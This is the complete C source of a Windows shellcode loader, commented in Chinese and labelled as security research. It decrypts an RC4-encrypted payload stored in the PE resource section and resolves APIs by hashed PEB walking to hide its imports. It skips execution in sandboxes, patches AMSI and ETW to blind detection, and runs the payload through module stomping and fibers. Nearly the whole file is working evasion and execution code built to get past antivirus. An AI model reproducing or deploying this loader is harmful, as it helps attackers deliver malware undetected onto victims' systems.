/*
 * Advanced Shellcode Loader - 资源段嵌入版 (单文件, 安全研究用途)
 *
 * 核心架构:
 *   加密 Shellcode 存入 PE 的 .rsrc (资源段) 而非 .data 段
 *   .rsrc 段常用于存储图标/位图等合法资源：ML 引擎对其分析策略与 .data 段不同
 *   运行时通过 FindResource/LockResource 读取，无需外置文件
 *
 * 规避技术:
 *   [1] Payload 存于 .rsrc (资源段)，非 .data 数据段，规避 ML 特征扫描
 *   [2] 动态 API 解析 (PEB 游走 + DJB2)：敏感 API 不出现在 IAT
 *   [3] AMSI Bypass + ETW Patch
 *   [4] 反沙箱检测
 *   [5] RC4 解密 (密钥内嵌，仅 16 字节，无害)
 *   [6] Module Stomping + VirtualAlloc 兜底
 *   [7] Fiber 执行，无新线程
 *   [8] 随机 BUILD_ID 保证每次编译哈希唯一
 */

#include <windows.h>

// 每次编译注入的随机 Build ID，确保 EXE 文件哈希每次不同
static const unsigned char _bid[] = { /* __BUILD_ID__ */ };

// RC4 密钥（16字节，由 builder.py 每次随机生成并注入，无害）
static const unsigned char _key[] = { /* __KEY_PLACEHOLDER__ */ };

// ─────────────────────────────────────────────
// DJB2 哈希 + PE 导出表解析
// ─────────────────────────────────────────────

static DWORD _h(const char* s) {
    DWORD h = 5381;
    while (*s) h = ((h << 5) + h) + (unsigned char)*s++;
    return h;
}

static PVOID _e(PVOID base, DWORD tgt) {
    if (!base) return NULL;
    PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((BYTE*)base + d->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY x = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)base + n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)base + x->AddressOfNames);
    WORD*  ords  = (WORD*) ((BYTE*)base + x->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)base + x->AddressOfFunctions);
    for (DWORD i = 0; i < x->NumberOfNames; i++) {
        if (_h((const char*)((BYTE*)base + names[i])) == tgt)
            return (PVOID)((BYTE*)base + funcs[ords[i]]);
    }
    return NULL;
}

// ─────────────────────────────────────────────
// PEB 游走获取模块基址 (支持 x86/x64)
// ─────────────────────────────────────────────

static PVOID _peb_mod(int is_k32) {
    void* peb;
#ifdef _WIN64
    __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
    void*       ldr = *(void**)((BYTE*)peb  + 0x18);
    LIST_ENTRY* hd  = (LIST_ENTRY*)((BYTE*)ldr + 0x10);
#else
    __asm__ volatile("movl %%fs:0x30, %0" : "=r"(peb));
    void*       ldr = *(void**)((BYTE*)peb  + 0x0C);
    LIST_ENTRY* hd  = (LIST_ENTRY*)((BYTE*)ldr + 0x0C);
#endif
    LIST_ENTRY* en  = hd->Flink;
    while (en && en != hd) {
#ifdef _WIN64
        WCHAR* nm = *(WCHAR**)((BYTE*)en + 0x60);
        void*  b  = *(void**)((BYTE*)en  + 0x30);
#else
        WCHAR* nm = *(WCHAR**)((BYTE*)en + 0x2C);
        void*  b  = *(void**)((BYTE*)en  + 0x18);
#endif
        if (nm && b) {
            if (is_k32) {
                if ((nm[0]|0x20)=='k' && (nm[1]|0x20)=='e' &&
                    (nm[2]|0x20)=='r' && (nm[3]|0x20)=='n' &&
                     nm[6]=='3'        && nm[7]=='2')
                    return b;
            } else {
                if ((nm[0]|0x20)=='n' && (nm[1]|0x20)=='t' &&
                    (nm[2]|0x20)=='d' && (nm[3]|0x20)=='l' && (nm[4]|0x20)=='l' &&
                    nm[5]=='.')
                    return b;
            }
        }
        en = en->Flink;
    }
    return NULL;
}

// ─────────────────────────────────────────────
// 预计算哈希值 (python builder.py --hashes 验证)
// ─────────────────────────────────────────────

#define H_VirtualAlloc          0x382c0f97UL
#define H_VirtualFree           0x668fcf2eUL
#define H_VirtualProtect        0x844ff18dUL
#define H_LoadLibraryA          0x5fbff0fbUL
#define H_ConvertThreadToFiber  0xc1283ae9UL
#define H_CreateFiber           0xeb969ba1UL
#define H_SwitchToFiber         0xc2d09e02UL
#define H_DeleteFiber           0x1cd85cc0UL
#define H_EtwEventWrite         0x24a8d022UL
#define H_AmsiScanBuffer        0x29fcd18eUL
#define H_GlobalMemoryStatusEx  0xe4b211f0UL
#define H_GetSystemInfo         0x8308eff6UL
#define H_GetSystemMetrics      0xa988c1a1UL
#define H_GetTickCount64        0x614db023UL
#define H_Sleep                 0x0e19e5feUL

typedef LPVOID (WINAPI *fp_VA)  (LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *fp_VF)  (LPVOID, SIZE_T, DWORD);
typedef BOOL   (WINAPI *fp_VP)  (LPVOID, SIZE_T, DWORD, PDWORD);
typedef HMODULE(WINAPI *fp_LL)  (LPCSTR);
typedef LPVOID (WINAPI *fp_CTF) (PVOID);
typedef LPVOID (WINAPI *fp_CF)  (SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
typedef VOID   (WINAPI *fp_SF)  (LPVOID);
typedef VOID   (WINAPI *fp_DF)  (LPVOID);
typedef BOOL   (WINAPI *fp_GMS) (LPMEMORYSTATUSEX);
typedef VOID   (WINAPI *fp_GSI) (LPSYSTEM_INFO);
typedef int    (WINAPI *fp_GSM) (int);
typedef ULONGLONG (WINAPI *fp_GTC)(void);
typedef VOID   (WINAPI *fp_SL)  (DWORD);

static fp_VA  pVA;
static fp_VF  pVF;
static fp_VP  pVP;
static fp_LL  pLL;
static fp_CTF pCTF;
static fp_CF  pCF;
static fp_SF  pSF;
static fp_DF  pDF;
static fp_GMS pGMS;
static fp_GSI pGSI;
static fp_GSM pGSM;
static fp_GTC pGTC;
static fp_SL  pSL;

static int ResolveAPIs(void) {
    PVOID k32  = _peb_mod(1);
    if (!k32) return 0;
    pVA  = (fp_VA)  _e(k32, H_VirtualAlloc);
    pVF  = (fp_VF)  _e(k32, H_VirtualFree);
    pVP  = (fp_VP)  _e(k32, H_VirtualProtect);
    pLL  = (fp_LL)  _e(k32, H_LoadLibraryA);
    pCTF = (fp_CTF) _e(k32, H_ConvertThreadToFiber);
    pCF  = (fp_CF)  _e(k32, H_CreateFiber);
    pSF  = (fp_SF)  _e(k32, H_SwitchToFiber);
    pDF  = (fp_DF)  _e(k32, H_DeleteFiber);
    pGMS = (fp_GMS) _e(k32, H_GlobalMemoryStatusEx);
    pGSI = (fp_GSI) _e(k32, H_GetSystemInfo);
    pGSM = (fp_GSM) _e(k32, H_GetSystemMetrics);
    pGTC = (fp_GTC) _e(k32, H_GetTickCount64);
    pSL  = (fp_SL)  _e(k32, H_Sleep);
    return (pVA && pVP && pLL && pCTF && pCF && pSF);
}

// ─────────────────────────────────────────────
// RC4 解密
// ─────────────────────────────────────────────

static void RC4(unsigned char* data, size_t dlen, const unsigned char* key, size_t klen) {
    unsigned char S[256];
    int j = 0;
    for (int i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
    }
    int i = 0; j = 0;
    for (size_t n = 0; n < dlen; n++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
        data[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

// ─────────────────────────────────────────────
// 从 PE 资源段读取加密 Payload
// 资源 ID 101 / RT_RCDATA，存储于 .rsrc 段
// ─────────────────────────────────────────────

static BYTE* LoadFromResource(DWORD* outSize) {
    HRSRC   hRsc  = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
    if (!hRsc) return NULL;
    HGLOBAL hGlob = LoadResource(NULL, hRsc);
    if (!hGlob) return NULL;
    LPVOID  pEnc  = LockResource(hGlob);
    DWORD   encSz = SizeofResource(NULL, hRsc);
    if (!pEnc || !encSz) return NULL;

    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, encSz);
    if (!buf) return NULL;
    memcpy(buf, pEnc, encSz);
    *outSize = encSz;
    return buf;
}

// ─────────────────────────────────────────────
// 反沙箱检测
// ─────────────────────────────────────────────

static BOOL IsSandboxed(void) {
    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
    if (pGMS) { pGMS(&ms); if (ms.ullTotalPhys < (2ULL << 30)) return TRUE; }
    SYSTEM_INFO si;
    if (pGSI) { pGSI(&si); if (si.dwNumberOfProcessors < 2) return TRUE; }
    if (pGTC && pGTC() < 300000ULL) return TRUE;
    if (pGSM && pGSM(SM_CXSCREEN) < 800) return TRUE;
    return FALSE;
}

// ─────────────────────────────────────────────
// AMSI Bypass
// ─────────────────────────────────────────────

static void PatchAMSI(void) {
    if (!pLL) return;
    // "amsi.dll" 运行时构造，避免字符串静态扫描
    char dll[] = {'a','m','s','i','.','d','l','l',0};
    HMODULE h = pLL(dll);
    if (!h) return;
    PVOID p = _e(h, H_AmsiScanBuffer);
    if (!p) return;
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old;
    pVP(p, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch, sizeof(patch));
    pVP(p, sizeof(patch), old, &old);
}

// ─────────────────────────────────────────────
// ETW Patch
// ─────────────────────────────────────────────

static void PatchETW(void) {
    PVOID ntdl = _peb_mod(0);
    if (!ntdl || !pVP) return;
    PVOID p = _e(ntdl, H_EtwEventWrite);
    if (!p) return;
    unsigned char patch[] = { 0xC3 };
    DWORD old;
    pVP(p, 1, PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch, 1);
    pVP(p, 1, old, &old);
}

// ─────────────────────────────────────────────
// Module Stomping
// ─────────────────────────────────────────────

static const char* STOMP_DLLS[] = {
    "shell32.dll", "ole32.dll", "urlmon.dll", "wininet.dll", "combase.dll", NULL
};

static PVOID ModuleStomping(const BYTE* payload, SIZE_T sz) {
    for (int i = 0; STOMP_DLLS[i]; i++) {
        HMODULE hd = GetModuleHandleA(STOMP_DLLS[i]);
        if (!hd && pLL) hd = pLL(STOMP_DLLS[i]);
        if (!hd) continue;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hd;
        PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)hd + dos->e_lfanew);
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
        PVOID target = NULL;
        for (WORD s = 0; s < nt->FileHeader.NumberOfSections; s++, sec++) {
            if ((sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) && sec->Misc.VirtualSize >= (DWORD)sz) {
                target = (PVOID)((BYTE*)hd + sec->VirtualAddress);
                break;
            }
        }
        if (!target) continue;
        DWORD old;
        if (!pVP(target, sz, PAGE_READWRITE, &old)) continue;
        memcpy(target, payload, sz);
        pVP(target, sz, PAGE_EXECUTE_READ, &old);
        return target;
    }
    return NULL;
}

// ─────────────────────────────────────────────
// 兜底: VirtualAlloc RW→RX
// ─────────────────────────────────────────────

static PVOID FallbackAlloc(const BYTE* payload, SIZE_T sz) {
    LPVOID m = pVA(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!m) return NULL;
    memcpy(m, payload, sz);
    DWORD old;
    if (!pVP(m, sz, PAGE_EXECUTE_READ, &old)) { pVF(m, 0, MEM_RELEASE); return NULL; }
    return m;
}

// ─────────────────────────────────────────────
// Fiber 执行 (无新线程)
// ─────────────────────────────────────────────

static void FiberExecute(PVOID addr) {
    LPVOID mf = pCTF ? pCTF(NULL) : NULL;
    if (!mf) { ((void(*)(void))addr)(); return; }
    LPVOID sf = pCF ? pCF(0, (LPFIBER_START_ROUTINE)addr, mf) : NULL;
    if (!sf)  { ((void(*)(void))addr)(); return; }
    pSF(sf);
    if (pDF) pDF(sf);
}

// ─────────────────────────────────────────────
// 主函数
// ─────────────────────────────────────────────

int main(void) {
    // 1. PEB 游走解析所有敏感 API (不依赖 IAT)
    if (!ResolveAPIs()) return 1;

    // 2. 从 .rsrc 资源段读取加密 payload
    DWORD encSz = 0;
    BYTE* enc = LoadFromResource(&encSz);
    if (!enc) return 1;

    // 3. 解密 (RC4 密钥内嵌于 .data，仅 16 字节)
    RC4(enc, encSz, _key, 16);

    // 4. 反沙箱检测
    if (IsSandboxed()) {
        if (pSL) pSL(5000);
        HeapFree(GetProcessHeap(), 0, enc);
        return 0;
    }

    // 5. AMSI + ETW
    PatchAMSI();
    PatchETW();

    // 6. 执行 (Module Stomping 优先，兜底 VirtualAlloc)
    PVOID exec = ModuleStomping(enc, encSz);
    if (!exec) exec = FallbackAlloc(enc, encSz);

    SecureZeroMemory(enc, encSz);
    HeapFree(GetProcessHeap(), 0, enc);

    if (!exec) return 1;

    FiberExecute(exec);
    return 0;
}
